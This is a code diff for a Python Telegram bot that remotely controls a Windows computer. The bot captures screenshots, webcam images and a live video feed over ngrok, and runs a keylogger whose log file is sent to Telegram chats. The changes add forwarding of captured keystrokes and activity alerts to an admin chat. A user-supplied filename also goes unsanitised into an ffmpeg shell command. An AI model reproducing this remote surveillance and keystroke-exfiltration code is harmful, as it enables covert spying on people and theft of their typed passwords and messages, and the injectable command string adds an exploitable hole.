@@ -26,12 +26,12 @@ class features:
         self.ngrok_token = os.getenv("NGROK_TOKEN")
         self.chat_id_file = 0
         self.photo_name='photo.png'
-        self.authorzed_Users='authorzed_Users/authorzed_Users.json'
+        self.authorzed_users='authorzed_Users/authorzed_Users.json'
         self.key_log_file="KeyLoger.txt"
         self.fin = ''
         self.random_f = ''
         self.fname = ''
-        self.fileMessageId = ''
+        self.file_message_id = ''
         self.video_therad_state=''
         self.random = 1
         self.now = datetime.datetime.now()
@@ -44,13 +44,13 @@ class features:
         file_found = False
         while not file_found:
             try:
-                with open(self.authorzed_Users) as f:
+                with open(self.authorzed_users) as f:
                     self.auth_list = json.load(f)
                 print(self.auth_list)
                 file_found = True
             except FileNotFoundError:
                 data = {'authorized': [{'chat_id': None, 'Name': None}]}
-                with open(features.authorzed_Users, 'w') as f:
+                with open(self.authorzed_users, 'w') as f:
                     json.dump(data, f, indent=2)
 
     def test_message(self):
@@ -71,6 +71,8 @@ class features:
             ngrok.kill()
             self.telegram_bot.sendMessage(chat_id,"video feed ended")
             self.video_therad_state=""
+            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)): 
+                self.telegram_bot.sendMessage(self.admin_chat_id,f'''live video feed stopped by {first_name} {last_name}.''')
         else:
             lw.start_server()
             tunnel=ngrok.connect(5000,'http')
@@ -84,8 +86,8 @@ class features:
     def download_file(self,msg, key):
         key_list = ["text", "voice", "photo", "video", "document"]
         chat_id = msg['chat']['id']
-        self.fileMessageId = msg['message_id']
-        print(self.fileMessageId)
+        self.file_message_id = msg['message_id']
+        print(self.file_message_id)
         self.chat_id_file = chat_id
         authorized = False
         if self.pending == 0 or chat_id != self.aut_chat_id:
@@ -95,7 +97,7 @@ class features:
                     break
         if authorized:
             if key == key_list[4]:
-                fname = msg[key]["file_name"]
+                self.fname = msg[key]["file_name"]
             if key == "photo":
                 fid = msg[key][3]["file_id"]
             else:
@@ -113,7 +115,7 @@ class features:
                 if self.fname.endswith(".oga"):
                     with open(f'downloads/{self.fname}', "wb") as f:
                         f.write(self.fin.content)  
-                    speach_recon,text=self.recognise_speech_and_do(chat_id,self.fname)
+                    speach_recon,text=self.recognise_speech_and_do(chat_id,self.fname,f"{msg['chat']['first_name'] } {msg['chat']['last_name']}")
                     return speach_recon,text
                 else:
                     print(self.admin_chat_id)
@@ -127,20 +129,20 @@ class features:
                     return speach_recon,text
             else:
                 text=''
-                with open(f'downloads/{fname}', "wb") as f:
+                with open(f'downloads/{self.fname}', "wb") as f:
                     f.write(self.fin.content)    
-                if fname.endswith(".oga"):
-                    speach_recon,text=self.recognise_speech_and_do(chat_id,fname)  
+                if self.fname.endswith(".oga"):
+                    speach_recon,text=self.recognise_speech_and_do(chat_id,self.fname,f"{msg['chat']['first_name'] } {msg['chat']['last_name']}")  
                     
                 self.chat_id_file = 0
                 self.fin = ""
-                self.telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
-                fname = ""
+                self.telegram_bot.sendMessage(chat_id, f'file saved as {self.fname}')
+                self.fname = ""
                 
-                self.fileMessageId = "aa"
+                self.file_message_id = "aa"
                 return speach_recon,text
 
-    def recognise_speech_and_do(self,chat_id,fname):
+    def recognise_speech_and_do(self,chat_id,fname,name):
         
         convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
         print(convert_command)
@@ -156,7 +158,7 @@ class features:
                 # recognize (convert from speech to text)
                 text = speach.recognize_google(audio_data)
         except sr.UnknownValueError:
-            self.telegram_bot.sendMessage(chat_id,f"Didn't get what you said")
+            self.telegram_bot.sendMessage(chat_id,f"Didn't get what you said {name}")
             
             os.remove(f"downloads/{fname}.wav")
             os.remove(f"downloads/{fname}")
@@ -170,7 +172,7 @@ class features:
         self.chat_id_file = 0
         self.fin = ""
         fname = ""
-        self.fileMessageId = "aa"
+        self.file_message_id = "aa"
         return True,text
     def speak(self ,command):
         speak = pyttsx3.init()
@@ -185,7 +187,7 @@ class features:
         self.fin = ""
         self.telegram_bot.sendMessage(chat_id, f'file saved as {self.fname}')
         self.fname = ""
-        self.fileMessageId = "aa"
+        self.file_message_id = "aa"
     def take_screenshot(self ,chat_id):
         print("scr")
         img = pyscreenshot.grab()
@@ -212,17 +214,24 @@ class features:
         cv2.imwrite(self.photo_name, img)
         self.telegram_bot.sendPhoto(chat_id, photo=open(self.photo_name, 'rb'))
         os.remove(self.photo_name)
-    def key_logger(self,chat_id):
+    def key_logger(self,chat_id,first_name,last_name):
         if not self.logging:
             self.logger = Listener(on_press=key_handeler)
             self.logger.start()
             self.telegram_bot.sendMessage(chat_id, "Key logger stared")
             self.logging = True
+            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)): 
+                self.telegram_bot.sendMessage(self.admin_chat_id,f'''Key logger started by {first_name} {last_name}.''')
         else:
             self.logger.stop()
             self.telegram_bot.sendMessage(chat_id, "Key logger stopped")
             self.telegram_bot.sendDocument(
                 chat_id, document=open(self.key_log_file, "rb"))
+            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)): 
+                self.telegram_bot.sendMessage(self.admin_chat_id,f'''Key logger stopped by {first_name} {last_name},
+here is log''')
+                self.telegram_bot.sendDocument(
+                self.admin_chat_id, document=open(self.key_log_file, "rb"))
             x = open(self.key_log_file, "w")
             x.close()
             os.remove(self.key_log_file)
@@ -252,7 +261,7 @@ class features:
             self.auth_list['authorized'].append(new_guy)
             print(self.auth_list)
             self.pending = 0
-            with open(self.authorzed_Users, 'w') as f:
+            with open(self.authorzed_users, 'w') as f:
                 json.dump(self.auth_list, f, indent=2)
                 f.close()
         else:
